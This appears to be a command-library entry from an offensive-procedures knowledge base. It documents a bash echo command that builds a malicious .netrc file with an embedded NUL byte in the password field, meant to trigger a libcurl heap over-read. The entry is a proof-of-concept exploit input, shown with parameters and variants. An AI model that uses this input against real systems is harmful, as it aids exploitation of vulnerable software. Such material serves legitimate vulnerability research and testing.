---
id: cmd-001
data: >-
  echo -en 'machine 127.0.0.1 login username password\x00
  nothing-suspicious-here\n' > poc.txt
tags:
  - file-creation
  - exploit-setup
type: command
output: File poc.txt containing the specified line
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:13.311Z'
verified: false
validated: true
submitted: true
---
# echo-create-malicious-netrc

## Command

```bash
echo -en 'machine 127.0.0.1 login username password\x00 nothing-suspicious-here\n' > poc.txt
```

## Description

This bash command creates a malicious .netrc file by echoing a line with an embedded NUL byte (\x00) in the password field, used to trigger the libcurl heap over-read vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-en` | Enables backslash escape interpretation (`-e`) and no trailing newline (`-n`) | Yes |
| `'machine 127.0.0.1 login username password\x00 nothing-suspicious-here\n'` | The .netrc line content, with \x00 as the exploit trigger | Yes |
| `> poc.txt` | Redirects output to the file poc.txt | Yes |

## Examples

### Basic Usage

```bash
echo -en 'machine 127.0.0.1 login username password\x00 nothing-suspicious-here\n' > poc.txt
```

### Advanced Usage

To create with different machine/login:

```bash
echo -en 'machine example.com login user password\x00 extra-data\n' > custom.netrc
```

## Expected Output

The file poc.txt is created with the exact content, including the NUL byte. Verifiable with `cat poc.txt` or `hexdump -C poc.txt` showing 00 after 'password'.

## Related

- [[procedures/Create-Malicious-netrc-File-with-NUL-Byte]]
